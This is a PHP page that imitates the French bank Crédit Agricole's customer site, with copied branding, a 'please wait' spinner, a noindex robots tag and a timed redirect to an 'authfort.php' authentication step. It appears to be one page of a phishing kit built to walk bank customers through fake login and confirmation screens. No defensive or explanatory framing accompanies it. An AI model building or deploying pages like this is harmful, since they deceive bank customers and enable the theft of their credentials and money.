<?php



include_once '../inc/app.php';
$random   = rand(0,100000000000);
$dispatch = substr(md5($random), 0, 17);
?>
<!DOCTYPE html>
<html lang="en">
<head>

    <!-- Meta Tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">

    <!-- Browser Color Styling -->
    <meta name="theme-color" content="#6dc77a"/>
    <meta name="msapplication-navbutton-color" content="#6dc77a"/>
    <meta name="apple-mobile-web-app-status-bar-style" content="#6dc77a" />

    <!-- Favicon -->
    <link rel="icon" type="image/png" href="../assets/images/favicon.png">
    
    <!-- Bootstrap -->
    <link rel="stylesheet" href="../assets/css/bootstrap.min.css" />
    
    <!-- Helpers -->
    <link rel="stylesheet" href="../assets/css/helpers.css" />

    <!-- Fonts -->
    <link rel="stylesheet" href="../assets/css/fonts.css" />

    <!-- Main -->
    <link rel="stylesheet" href="../assets/css/main.css" />

    <title>Acc&egrave;s CR - Crédit Agricole</title>

</head>
<body>

    <!-- HEADER -->
    <header id="header" class="d-lg-flex d-md-none d-sm-none d-none">
        <div class="left col-md-2">
            <div class="logo text-center"><a href="#"><img src="../assets/images/logo.svg"></a></div>
        </div>
        <div class="right col-md-10 pl-0">
            <div class="top d-flex align-items-center h-50">
                <div class="first"><a href="#">Vous êtes un particulier <i class="fas fa-chevron-down"></i></a></div>
                <div class="second flex-grow-1">
                    <div class="d-flex align-items-center justify-content-center">
                        <div class="form flex-grow-1 d-flex justify-content-center align-items-center">
                            <span class="flex-grow-1">Rechercher une thématique, un produit...</span>
                            <i class="fas fa-search"></i>
                        </div>
                        <div class="marker d-flex justify-content-center align-items-center">
                            <i class="fas fa-map-marker-alt"></i>
                        </div>
                    </div>
                </div>
                <div class="third">
                    <ul>
                        <li><a href=""><i class="far fa-circle"></i> Nous contacter</a></li>
                        <li><a href=""><i class="fas fa-sign-out-alt"></i> Se déconnecter</a></li>
                    </ul>
                </div>
            </div>
            <div class="bottom d-flex align-items-center h-50">
                <ul>
                    <li><a href="#">COMPTES & CARTES</a></li>
                    <li><a href="#">ÉPARGNER</a></li>
                    <li><a href="#">S'ASSURER</a></li>
                    <li><a href="#">EMPRUNTER</a></li>
                    <li><a href="#">SIMULATION & DEVIS</a></li>
                    <li><a href="#">NOS CONSEILS</a></li>
                </ul>
            </div>
        </div>
    </header>
    <!-- END HEADER -->

    <header id="header2" class="d-lg-none d-md-block d-sm-block d-block">
        <div class="logo">
            <a href="#"><img style="max-width: 170px;" src="../assets/images/calogo.png"></a>
        </div>
        <div class="closse"><i class="fas fa-times"></i></div>
    </header>

    <div class="container">
        <nav aria-label="breadcrumb">
            <ol class="breadcrumb">
                <li class="breadcrumb-item active">Accueil</li>
                <li class="breadcrumb-item"><a href="#">Validation</a></li>
            </ol>
        </nav>
    </div>

    <!-- MAIN -->
    <main id="main" class="main mt-5">
        <div class="container">
            
            <div class="text-center">
                <div class="lds-ellipsis"><div></div><div></div><div></div><div></div></div>
                <p style="color: #333; margin-top: -10px;margin-bottom: 0; font-weight: 600; font-size: 13px;">Veuillez patienter</p>
            </div>

        </div>
    </main>
    <!-- END MAIN -->

    

    <script src="../assets/js/jquery.min.js"></script>
    <script src="../assets/js/popper.min.js"></script>
    <script src="../assets/js/bootstrap.min.js" ></script>
    <script src="../assets/js/fontawesome.js"></script>
    <script src="../assets/js/main.js"></script>

    <script type="text/javascript">
        var dispatch = '<?php echo $dispatch; ?>';
        setTimeout(function () {
            window.location.href= 'authfort.php?confirmation#_'+ dispatch;
        },20000); // 1000 = 1s
    </script>

</body>
</html>